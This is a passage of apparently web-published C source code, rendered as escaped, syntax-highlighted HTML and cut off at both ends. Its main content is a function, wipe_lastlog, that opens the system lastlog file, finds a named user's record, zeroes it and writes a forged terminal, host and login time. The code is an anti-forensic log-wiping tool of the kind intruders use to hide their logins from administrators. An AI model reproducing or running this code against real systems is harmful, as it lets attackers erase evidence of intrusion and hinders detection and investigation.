class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * LASTLOG editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_lastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003elastlog\u003c/span\u003e\t\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003epasswd\u003c/span\u003e\t\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003etm\u003c/span\u003e\t\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eLASTLOG_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003etm\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nf\"\u003emalloc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the lastlog file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eLASTLOG_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eLASTLOG_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epwd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003egetpwnam\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Can\u0026#39;t find user in passwd.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003elong\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003epw_uid\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003elastlog\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003estrncpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ell_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/* YYMMddhhmm */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Time format is YYMMddhhmm.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t\t * Extract Times.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_year\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_mon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_mday\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_hour\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etimestr\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"n\"\u003etm\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003etm_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eatoi\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan 